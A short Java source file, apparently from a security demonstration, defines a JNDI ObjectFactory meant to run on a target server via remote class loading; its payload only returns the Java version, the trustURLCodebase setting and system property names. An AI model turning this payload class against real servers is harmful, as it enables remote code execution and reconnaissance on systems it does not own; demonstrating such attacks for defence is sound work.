package dev.sonatype.slyserver.hacks;

import javax.naming.Context;
import javax.naming.Name;
import java.util.Hashtable;

public class ExternalObject implements javax.naming.spi.ObjectFactory {

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {

        // all this code get executed on the target server.

        return "java.version="+System.getProperty("java.version")+"\n"+System.getProperty("com.sun.jndi.ldap.object.trustURLCodebase")+"??"+System.getProperties().keySet();

    }


}


